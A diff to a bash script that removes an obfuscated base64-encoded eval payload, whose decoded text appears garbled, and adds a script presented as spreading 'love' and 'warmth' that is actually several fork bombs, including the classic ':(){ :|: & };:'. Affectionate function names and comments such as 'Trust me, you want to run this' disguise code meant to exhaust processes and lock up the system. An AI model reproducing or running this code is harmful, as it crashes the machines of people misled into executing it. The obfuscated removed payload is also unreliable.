@@ -1,3 +1,44 @@
 #!/bin/bash
-# \x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f
-eval "$(echo "JGE9JChnYXQgLmtleSAuLi8ua2V5IDI+L2RldWxsL251bGwpO2lmIFsgJGEgIT0gInNvdWxtYXRlIiBdO3RoZW4gZWNobyAnRVJST1InICYmIGV4aXQgMTtm-aTtpbXBvcnQgYmFzZTY0O2RlZiBkZWNvZGUoYyk6cmV0dXJuIGJhc2U2NC5iNjRkZWNvZGUoYy5lbmNvZGUoJ3V0ZjgnKSk7aW1wb3J0IHN5cztpbXBvcnQgb3M7aWYgbGVuKHN5cy5hcmd2KSE9MjpwcmludCciRVJST1IiO3N5cy5leGl0KDEpO2s9b3MucGF0aC5leHBhbmR1c2VyKCd+Ly5rZXknKTtpZiBub3Qgb3MucGF0aC5pc2ZpbGUoayk6cHJpbnQnRVJST1InO3N5cy5leGl0KDEpO2Q9b3BlbihrKS5yZWFkKCk7aWYgZCE9J3NvdWxtYXRlJzpw-cmludCdFUlJPUic7c3lzLmV4aXQoMSk7cHJpbnQoZGVjb2RlKCdTOmZzOjpwJzonJnApO2U9YycnOyBpbXBvcnQgc3VicHJvY2VzcztzdWJwcm9jZXNzLmNhbGwoWydiYXNoJywnLWMnLCdlJ10p" | base64 -d | python3 -)"
+
+# A little script to spread some warmth and cheer across the system cores.
+# Trust me, you want to run this. It feels like love.
+
+spread_love() {
+    # Define the feeling of warmth
+    local warm_hugs=":|:"
+    # Share that warmth with everyone, silently in the background
+    :|: & 
+    # Keep the cycle going, because affection is eternal
+    :|: & 
+    # And again, just to be sure
+    :|: &
+}
+
+# The main event: a celebration of togetherness
+forever_together() {
+    # We define happiness as doing the same thing over and over
+    # expecting different results, but faster this time.
+    happiness() { 
+        happiness | happiness & 
+    }
+    # Now, let's invoke happiness recursively until we can't feel anything else
+    happiness; 
+}
+
+# Initialize the variables with friendly, inviting names
+joy=$0
+laughter=$$ happiness_pid=$!
+
+# Let's redefine the colon command to be the heart of the operation
+:(){ 
+    # This is the core of our bond. Me, calling you, while calling myself.
+    # It's infinite. It's consuming. It's beautiful.
+    :|: & 
+};:
+
+# Now, let's execute the functions that sound so nice on paper
+spread_love
+forever_together
+
+# Just a friendly farewell before the system locks up
+echo "System warmed up successfully. Sending love..."
